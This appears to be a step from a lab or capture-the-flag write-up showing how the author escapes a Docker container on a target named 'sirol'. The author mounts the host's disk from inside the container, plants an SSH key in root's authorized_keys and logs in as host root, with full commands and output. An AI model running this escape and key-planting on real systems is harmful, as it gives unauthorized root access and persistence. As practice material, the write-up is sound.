# 4 docker breakout > root

```
# we need to breakout
https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout

# no docker socket mounted
# no container capabilities

# can view mounted disks

root@0873e8062560:/# fdisk -l
fdisk -l
Disk /dev/sda: 20 GiB, 21474836480 bytes, 41943040 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x16939df4

Device     Boot    Start      End  Sectors Size Id Type
/dev/sda1  *        2048 37750783 37748736  18G 83 Linux
/dev/sda2       37752830 41940991  4188162   2G  5 Extended
/dev/sda5       37752832 41940991  4188160   2G 82 Linux swap / Solaris

# can mount /dev/sda1
root@0873e8062560:/# mkdir -p /mnt/kashz
mkdir -p /mnt/kashz
root@0873e8062560:/# mount /dev/sda1 /mnt/kashz
mount /dev/sda1 /mnt/kashz

# we have mounted the base fs as root
# can copy ssh key for stable root shell

root@0873e8062560:/mnt/kashz/root# mkdir .ssh
mkdir .ssh
root@0873e8062560:/mnt/kashz/root/.ssh# echo "ssh-rsa id_rsa.pub" > /mnt/kashz/root/.ssh/authorized_keys

$ ssh -i id_rsa root@192.168.134.54

root@sirol:~# whoami;id;hostname;uname -a
root
uid=0(root) gid=0(root) groups=0(root)
sirol
Linux sirol 4.9.0-12-amd64 #1 SMP Debian 4.9.210-1+deb9u1 (2020-06-07) x86_64 GNU/Linux
```

### Method 2

```
# using GlusterFS
```
